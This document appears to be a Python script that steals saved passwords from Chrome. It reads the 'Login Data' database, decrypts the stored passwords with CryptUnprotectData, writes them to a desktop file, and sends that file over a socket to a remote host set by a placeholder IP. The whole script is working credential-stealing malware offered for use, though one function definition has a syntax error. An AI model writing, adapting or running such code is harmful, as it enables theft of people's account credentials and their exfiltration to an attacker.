import os
import sqlite3
import win32crypt
import tqdm
import socket

SEPARATOR = "<SEPARATOR>"
BUFFER_SIZE = 4096
host = "YOUR IP ADDRESS"
port = 5001 # you can change it any available port , do so in both client and server side scripts


def get_chrome():
    data_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
    c = sqlite3.connect(data_path)
    cursor = c.cursor()
    select_statement = 'SELECT origin_url, username_value, password_value FROM logins'
    cursor.execute(select_statement)

    login_data = cursor.fetchall()

    cred = {}

    string = ''

    for url, user_name, pwd in login_data:
        pwd = win32crypt.CryptUnprotectData(pwd)
        cred[url] = (user_name, pwd[1].decode('utf8'))
        string += '\n[+] URL:%s USERNAME:%s PASSWORD:%s\n' % (url,user_name,pwd[1].decode('utf8'))
        passtxt = open(r'C:\Users\pc\Desktop\passtxt.txt','a')
        passtxt.write(string)
        print(string)

def send_to_host:
    s = socket.socket()
    print(f"[+] Connecting to {host}:{port}")
    s.connect((host, port))
    print("[+] Connected.")
    filename = os.path.expanduser('~') + r"\Desktop\passtxt.txt"
    filesize = os.path.getsize(filename)
    s.send(f"{filename}{SEPARATOR}{filesize}".encode())

    progress = tqdm.tqdm(range(filesize), f"Sending {filename}", unit="B", unit_scale=True, unit_divisor=1024)
    with open(filename, "rb") as f:
        while True:
            bytes_read = f.read(BUFFER_SIZE)
            if not bytes_read:
                break
        
            s.sendall(bytes_read)
            progress.update(len(bytes_read))

    s.close()


if __name__=='__main__':
    get_chrome()
    send_to_host()
